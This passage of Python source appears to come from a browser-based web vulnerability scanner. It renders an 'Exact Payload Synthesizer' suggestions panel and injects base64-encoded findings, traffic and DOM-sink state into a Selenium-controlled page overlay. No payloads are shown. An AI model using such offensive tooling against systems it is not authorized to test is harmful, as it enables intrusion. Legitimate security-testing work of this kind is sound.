            <div style="margin-top:20px; padding:15px; border:1px solid #333; background:#111; color:#888; text-align:center; border-radius:4px; font-size:11px;">
                <i>No vulnerabilities detected yet. The AI Engine will provide exact exploitation payloads tailored to your findings here.</i>
            </div>
            </div>
            """
        else:
            suggestions_html += """
            <div style="margin-bottom:20px;">
                <div style="font-size:12px; color:#fff; border-bottom:1px solid #444; padding-bottom:4px; margin-bottom:10px;"><strong>🎯 Exact Payload Synthesizer</strong></div>
            """

            for key, block in specific_suggestions.items():
                title = block['title']
                color = block['color']
                text = block['text']
                
                suggestions_html += f"""
                <details open style="margin-bottom:6px; background:#1a1a24; border:1px solid #333; border-radius:4px;">
                    <summary style="cursor:pointer; padding:8px; font-size:11px; font-weight:bold; color:{color};">{title}</summary>
                    <div style="padding:8px; font-size:10px; color:#bbb; border-top:1px solid #333; line-height:1.6;">
                        {text}
                    </div>
                </details>
                """

            suggestions_html += """
            </div>
            </div>
            """
        suggestions_html_b64 = base64.b64encode(suggestions_html.encode('utf-8')).decode('utf-8')

        findings_json = json.dumps(self.live_findings)
        findings_b64 = base64.b64encode(findings_json.encode('utf-8')).decode('utf-8')

        traffic_json = json.dumps(getattr(self, 'live_traffic', []))
        traffic_b64 = base64.b64encode(traffic_json.encode('utf-8')).decode('utf-8')

        domsinks_json = json.dumps(getattr(self, 'live_dom_sinks', []))
        domsinks_b64 = base64.b64encode(domsinks_json.encode('utf-8')).decode('utf-8')

        js_inject_state = f"""
        (function() {{
            try {{
                var findings = JSON.parse(window.atob('{findings_b64}'));
                var traffic = JSON.parse(window.atob('{traffic_b64}'));
                var domSinks = JSON.parse(window.atob('{domsinks_b64}'));
                
                if (window.__vulcanx_state) {{
                    var old_f = JSON.stringify(window.__vulcanx_state.findings);
                    var old_t = JSON.stringify(window.__vulcanx_state.traffic);
                    var old_d = JSON.stringify(window.__vulcanx_state.domSinks);

                    var new_f = JSON.stringify(findings);
                    var new_t = JSON.stringify(traffic);
                    var new_d = JSON.stringify(domSinks);
                    var new_s = '{suggestions_html_b64}';
                    
                    window.__vulcanx_state.findings = findings;
                    window.__vulcanx_state.traffic = traffic;
                    window.__vulcanx_state.domSinks = domSinks;
                    window.__vulcanx_state.suggestions_html = new_s;
                    
                    if (window.__vulcanx_state.activeTab === 'vulnerabilities' && old_f !== new_f) {{
                        window.__vulcanx_render();
                    }} else if (window.__vulcanx_state.activeTab === 'traffic' && old_t !== new_t) {{
                        window.__vulcanx_render();
                    }} else if (window.__vulcanx_state.activeTab === 'dom' && old_d !== new_d) {{
                        window.__vulcanx_render();
                    }} else if (window.__vulcanx_state.activeTab !== 'vulnerabilities' && window.__vulcanx_state.activeTab !== 'traffic' && window.__vulcanx_state.activeTab !== 'dom') {{
                        // Do not re-render forms or storage just because traffic changed
                    }}
                    
                    var suggestEl = document.getElementById('vulcanx-suggest-list');
                    if (suggestEl) {{
                        if (suggestEl.getAttribute('data-b64') !== new_s) {{
                            suggestEl.innerHTML = new_s ? decodeURIComponent(escape(window.atob(new_s))) : '<div style="color:#666;padding:10px;">No correlated suggestions yet.</div>';
                            suggestEl.setAttribute('data-b64', new_s);
                        }}
                    }}

                    var tabSuggestBadge = document.getElementById('vulcanx-tab-suggest');
                    if (tabSuggestBadge) {{
                        tabSuggestBadge.innerText = 'SUGGESTIONS ({len(sorted_hyps)})';
                    }}
                }}
            }} catch(e) {{}}
        }})();
        """

        try:
            self.driver.execute_script(WIDGET_INIT_JS)
            self.driver.execute_script(js_inject_state)
        except Exception as e:
            if "alert" in str(e).lower() or "unexpected" in str(e).lower():
                pass # Alert open, user is interacting, ignore safely
            else:
                print(f"[!] Widget Injection Error (Python): {e}")

    def stop(self):
        self.running = False
        if self.har_out and self.har is not None:
            try:
                self.har.save(self.har_out)
                print(f"[+] HAR traffic export saved to {self.har_out} ({len(self.har.entries)} entries)")
            except Exception as e:
                print(f"[-] Failed to save HAR export: {e}")
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass

WIDGET_INIT_JS = (
    WIDGET_INIT_JS_PART_1 + 
    "if (tab === 'vulnerabilities') {\n" + VULNERABILITIES_TAB_JS +
    "} else if (tab === 'traffic') {\n" + TRAFFIC_TAB_JS +
    "} else if (tab === 'forms') {\n" + FORMS_TAB_JS +
    "} else if (tab === 'storage') {\n" + STORAGE_TAB_JS +
    "} else if (tab === 'map') {\n" + MAP_TAB_JS +
    "} else if (tab === 'payloads') {\n" + PAYLOADS_TAB_JS +
    "} else if (tab === 'dom') {\n" + DOM_TAB_JS +
    "} else if (tab === 'scope') {\n" + SCOPE_TAB_JS +
    "} else if (tab === 'vpn') {\n" + VPN_TAB_JS +
    "} else if (tab === 'report') {\n" + REPORT_TAB_JS +
    "}\n" + 
    WIDGET_INIT_JS_PART_2
)
